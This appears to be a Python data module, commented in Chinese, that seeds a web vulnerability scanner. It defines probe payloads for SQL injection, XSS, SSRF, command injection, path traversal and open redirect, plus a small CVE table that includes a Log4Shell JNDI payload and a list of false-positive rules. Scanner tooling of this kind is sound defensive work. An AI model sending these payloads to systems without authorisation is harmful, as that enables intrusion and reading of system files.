"""内置攻击模式、Payload 库、CVE 简库与误报特征库。

均为最小可用种子数据，供扫描器与验证器检索；运行时可由知识库与
学习引擎动态扩展。
"""
from __future__ import annotations

from typing import Any, Dict, List

# ── 攻击模式：按漏洞类型描述检测与验证逻辑 ──────────────────────────
ATTACK_PATTERNS: Dict[str, Dict[str, Any]] = {
    "sqli": {
        "name": "SQL 注入",
        "vectors": ["query", "header", "path"],
        # 命中信号：响应中出现的特征
        "hit_signals": [
            "SQL syntax", "mysql_fetch", "ORA-", "unclosed quotation",
            "syntax error at or near", "PG::SyntaxError",
        ],
        # 布尔/时间盲注验证
        "time_probe": "' AND SLEEP(5)-- -",
        "boolean_true": " AND 1=1-- -",
        "boolean_false": " AND 1=2-- -",
        "remediation": "使用参数化查询 / 预编译语句，禁用动态拼接。",
    },
    "xss": {
        "name": "跨站脚本",
        "vectors": ["query", "body", "header"],
        "hit_signals": [],
        # 反射回显检测：注入标记后检查是否原样回显
        "reflect_probe": "<svg/onload=alert(1)>",
        "remediation": "输出编码、CSP、HttpOnly Cookie。",
    },
    "ssrf": {
        "name": "服务端请求伪造",
        "vectors": ["query", "body"],
        "hit_signals": [],
        # 带外检测：指向受控回调
        "oob_probe_template": "http://{collab_host}/ssrf?tag={tag}",
        "remediation": "URL 白名单、禁用内网网段、隔离网络出口。",
    },
    "cmd_injection": {
        "name": "命令注入",
        "vectors": ["query", "body", "header"],
        "hit_signals": [
            "uid=", "gid=", "groups=", "Linux", "root:x:0:0",
        ],
        "time_probe": ";sleep 5;",
        "remediation": "避免调用系统命令，使用安全 API；参数严格校验。",
    },
    "path_traversal": {
        "name": "路径穿越",
        "vectors": ["query", "path"],
        "hit_signals": ["root:x:0:0", "[fonts]", "[extensions]"],
        "probe": "../../../../etc/passwd",
        "remediation": "规范化路径、白名单、chroot。",
    },
    "open_redirect": {
        "name": "开放重定向",
        "vectors": ["query"],
        "hit_signals": [],
        "probe": "https://evil.example.com",
        "remediation": "重定向目标白名单校验。",
    },
}

# ── CVE 简库：指纹 → 已知漏洞 ──────────────────────────────────────
CVE_DATABASE: List[Dict[str, Any]] = [
    {
        "cve": "CVE-2021-44228",
        "name": "Log4Shell JNDI 注入",
        "cvss": 10.0,
        "fingerprints": [{"component": "log4j", "version_max": "2.14.1"}],
        "oob_probe": "${jndi:ldap://{collab_host}/x}",
        "description": "Apache Log4j2 JNDI 特性导致 RCE。",
        "remediation": "升级 log4j2 至 2.17.1+，移除 JndiLookup 类。",
    },
    {
        "cve": "CVE-2017-5638",
        "name": "Struts2 S2-045 RCE",
        "cvss": 10.0,
        "fingerprints": [{"component": "struts", "version_max": "2.3.32"}],
        "description": "Struts2 Content-Type OGNL 注入导致 RCE。",
        "remediation": "升级 Struts2 至受影响范围之外版本。",
    },
    {
        "cve": "CVE-2022-22965",
        "name": "Spring4Shell",
        "cvss": 9.8,
        "fingerprints": [{"component": "spring", "version_max": "5.3.17"}],
        "description": "Spring Framework RCE via data binding。",
        "remediation": "升级 Spring Framework 至 5.3.18+ / 5.2.20+。",
    },
]

# ── 误报特征库：出现这些特征倾向判为误报 ───────────────────────────
FP_SIGNATURES: List[Dict[str, Any]] = [
    {
        "vuln_type": "sqli",
        "signals": ["404", "Not Found", "WAF"],
        "rule": "if response_code in (404,403) and no_payload_reflection",
        "verdict": "false_positive",
    },
    {
        "vuln_type": "xss",
        "signals": ["&lt;svg", "\\u003c", "blocked by waf"],
        "rule": "if payload_encoded_or_blocked",
        "verdict": "false_positive",
    },
    {
        "vuln_type": "ssrf",
        "signals": [],
        "rule": "if not oob_hit and no_internal_leak",
        "verdict": "false_positive",
    },
]
